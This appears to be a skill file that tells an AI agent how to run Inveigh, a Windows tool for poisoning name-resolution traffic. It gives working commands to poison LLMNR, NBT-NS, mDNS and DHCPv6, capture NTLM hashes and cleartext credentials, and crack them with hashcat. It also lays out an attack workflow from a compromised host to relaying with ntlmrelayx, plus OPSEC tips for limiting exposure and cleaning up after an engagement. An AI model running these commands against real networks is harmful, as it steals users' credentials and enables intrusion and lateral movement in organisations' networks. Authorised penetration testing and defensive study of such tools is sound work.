---
name: inveigh
description: "Windows .NET LLMNR/NBT-NS/mDNS/DNS poisoner and NTLM credential capture tool. Performs man-in-the-middle attacks by responding to broadcast name resolution requests and capturing NTLMv1/v2 hashes. Use when operating from a Windows host without access to Responder, when needing to capture NTLM hashes from network traffic, or when performing LLMNR/NBT-NS poisoning in AD environments."
license: BSD-3-Clause
compatibility: "Windows (.NET 4.6.2+ for C# version, PowerShell 2.0+ for PS version). Run from domain-joined or non-domain host on the target network. Requires local admin for raw socket access."
metadata:
  author: AeonDave
  version: "1.0"
---

# Inveigh

Windows-native LLMNR/NBT-NS/mDNS/DNS poisoner — capture NTLM hashes from a Windows host.

## Quick Start

```powershell
# PowerShell version — basic poisoning and capture
Import-Module .\Inveigh.ps1
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y

# C# version (InveighZero) — more features
.\Inveigh.exe
```

## PowerShell Module

### Basic capture
```powershell
Import-Module .\Inveigh.ps1

# Enable LLMNR + NBT-NS poisoning with console output
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y

# Full options
Invoke-Inveigh -IP <attacker_ip> -LLMNR Y -NBNS Y -mDNS Y -ConsoleOutput Y -FileOutput Y -OutputDir C:\temp\
```

### Interactive commands (while running)
Press ESC to enter interactive mode:

| Command | Description |
|---------|-------------|
| GET NTLMV1USERNAMES | List captured NTLMv1 users |
| GET NTLMV2USERNAMES | List captured NTLMv2 users |
| GET NTLMV1UNIQUE | Unique NTLMv1 hashes |
| GET NTLMV2UNIQUE | Unique NTLMv2 hashes |
| GET CLEARTEXT | Cleartext credentials |
| HELP | Show all commands |
| STOP | Stop Inveigh |

### Stop and retrieve
```powershell
Stop-Inveigh

# Get captured hashes
Get-Inveigh -NTLMv2
Get-Inveigh -NTLMv2Unique
Get-Inveigh -Cleartext
```

## C# Version (InveighZero)

More modern, standalone executable. Preferred for operations.

```cmd
# Basic run with defaults
.\Inveigh.exe

# Specify options
.\Inveigh.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y
```

### Key flags
- `-FileOutput Y` — write hashes to disk
- `-NBNS Y` — enable NBT-NS poisoning
- `-mDNS Y` — enable mDNS poisoning
- `-Proxy Y` — enable WPAD proxy capture
- `-MachineAccounts Y` — also capture machine account hashes
- `-DHCPv6 Y` — respond to DHCPv6 requests
- `-LLMNRv6 Y` — IPv6 LLMNR poisoning
- `-Challenge <hex>` — set custom NTLM challenge (for rainbow tables)

## Cracking captured hashes

```bash
# NTLMv2 hashes (hashcat mode 5600)
hashcat -m 5600 inveigh_ntlmv2.txt /path/to/wordlist.txt

# NTLMv1 hashes (hashcat mode 5500)
hashcat -m 5500 inveigh_ntlmv1.txt /path/to/wordlist.txt
```

## OPSEC considerations
- Noise level: MODERATE — responds to broadcast traffic only when requests occur
- Raw sockets require local admin privileges
- SMB server conflicts with Windows SMB service (port 445)
- Prefer targeting specific subnets/hosts to limit exposure
- Captured hashes logged in output directory — clean up after engagement
- Detection: unusual NBT-NS/LLMNR/mDNS responses from non-standard hosts

## Comparison with Responder
| Feature | Inveigh | Responder |
|---------|---------|-----------|
| Platform | Windows | Linux |
| Language | C#/.NET/PowerShell | Python |
| LLMNR | Yes | Yes |
| NBT-NS | Yes | Yes |
| mDNS | Yes | Yes |
| DHCPv6 | Yes | Yes |
| WPAD | Yes | Yes |
| SMB relay | No (use ntlmrelayx) | No (use ntlmrelayx) |
| In-memory | Yes (PS version) | No |

## Integration with AD workflow
1. Deploy Inveigh on compromised Windows host
2. Wait for NTLM hash captures (LLMNR/NBT-NS/mDNS)
3. Crack NTLMv2 hashes offline (hashcat -m 5600)
4. Or relay using ntlmrelayx (disable Inveigh SMB, relay to targets without SMB signing)

## Resources

No bundled `scripts/`, `references/`, or `assets/` are included in this skill. Use the PowerShell module help, InveighZero help output, and engagement-specific relay/cracking tooling as needed.
